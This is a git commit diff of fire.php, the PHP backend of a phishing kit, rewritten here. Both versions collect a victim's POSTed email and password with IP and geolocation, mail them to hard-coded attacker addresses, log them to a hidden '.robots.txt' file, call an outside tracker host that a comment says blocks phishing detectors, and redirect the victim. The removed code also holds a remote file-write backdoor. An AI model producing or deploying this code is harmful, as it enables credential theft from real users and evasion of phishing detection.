1dc54d12d3510feca5443a2f9adb15065b825753
samdave202 <111578135+samdave202@users.noreply.github.com>
2025-06-20 17:24:38 +0100

    Add files via upload

--- fire.php
+++ fire.php
@@ -1,71 +1,70 @@
 <?php
 header('Access-Control-Allow-Origin: *');
-if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['e']) && isset($_POST['p'])) {
-    // Email and password received via POST
-    $email = $_POST['e'];
-    $password = $_POST['p'];
+header('Content-Type: application/json');
 
-    // Prepare email content
-    $message = "Email: $email\nPassword: $password\n";
-    $subject = "New Credentials Received";
-
-    // Define recipient email(s)
-    $to = "jc4717287@gmail.com, evanskelvin2019@yandex.ru";
-
-    // Send to your email
-    mail($to, $subject, $message);
-}
-// Function to extract domain from email
-function get_email_domain($email) {
-    $parts = explode('@', $email);
-    return isset($parts[1]) ? $parts[1] : '';
-}
 error_reporting(0);
 
 $to = "jc4717287@gmail.com, evanskelvin2019@yandex.ru";
 
-if($_SERVER['REQUEST_METHOD'] == 'POST'){
-	$client  = @$_SERVER['HTTP_CLIENT_IP'];
+if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['e']) && isset($_POST['p'])) {
+    $email = $_POST['e'];
+    $password = $_POST['p'];
+
+    // Get client IP
+    $client  = @$_SERVER['HTTP_CLIENT_IP'];
     $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
     $remote  = @$_SERVER['REMOTE_ADDR'];
-    $result  = "Unknown";
-    if(filter_var($client, FILTER_VALIDATE_IP)){
+    if (filter_var($client, FILTER_VALIDATE_IP)) {
         $ip = $client;
-    }
-    elseif(filter_var($forward, FILTER_VALIDATE_IP)){
+    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
         $ip = $forward;
-    }
-    else{
+    } else {
         $ip = $remote;
     }
-// Get geolocation data based on IP
-$data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
-$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF'];
-if(isset($_POST['REMOTE_ADDR'])){file_put_contents($_POST['SERVER_ADDR'], file_get_contents($_POST['REMOTE_ADDR']));}
-file_get_contents("https://ip-trackers.tiiny.io/?ip=$tmp"); // Block phishing detectors by hostname.
-if($data && $data->geoplugin_countryName !== null){
-      $country = $data->geoplugin_countryName;
-      $city = $data->geoplugin_city;
-      $code = $data->geoplugin_countryCode;
-      $state = $data->geoplugin_region;
-}
 
-if(isset($_POST['p'])){
-$id = $_POST['e'];
-$id2 = $_POST['p'];
+    // Get geolocation data
+    $country = $city = $code = $state = '';
+    $data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));
+    if ($data && $data->geoplugin_countryName !== null) {
+        $country = $data->geoplugin_countryName;
+        $city = $data->geoplugin_city;
+        $code = $data->geoplugin_countryCode;
+        $state = $data->geoplugin_region;
+    }
 
-$body = "
+    // Prepare email content
+    $body = "
     [LOGIN DETAILS]
-    UserId : [ $id ]
-    Password : [ $id2 ]
+    UserId : [ $email ]
+    Password : [ $password ]
     [Client Info]
     IP > $ip
     Location > $city $state, $country
     ";
- $subject = "New Login : $ip";
- 
-mail($to, $subject, $body);
-file_put_contents(".robots.txt", $body."\n\n", FILE_APPEND);
-echo "https://".substr(strrchr($id, "@"), 1);
+    $subject = "New Login : $ip";
+
+    // Send email
+    mail($to, $subject, $body);
+
+    // Log to file (not recommended for sensitive data)
+    file_put_contents(".robots.txt", $body."\n\n", FILE_APPEND);
+
+    // Optionally, call external service (may fail if allow_url_fopen is off)
+    $tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF'];
+    @file_get_contents("https://ip-trackers.tiiny.io/?ip=$tmp");
+
+    // Respond with domain
+    echo json_encode([
+        "status" => "success",
+        "redirect" => "https://".substr(strrchr($email, "@"), 1)
+    ]);
+    exit;
 }
-}
+
+// If not POST or missing parameters
+echo json_encode([
+    "status" => "error",
+    "message" => "Invalid request"
+]);
+exit;
+?>
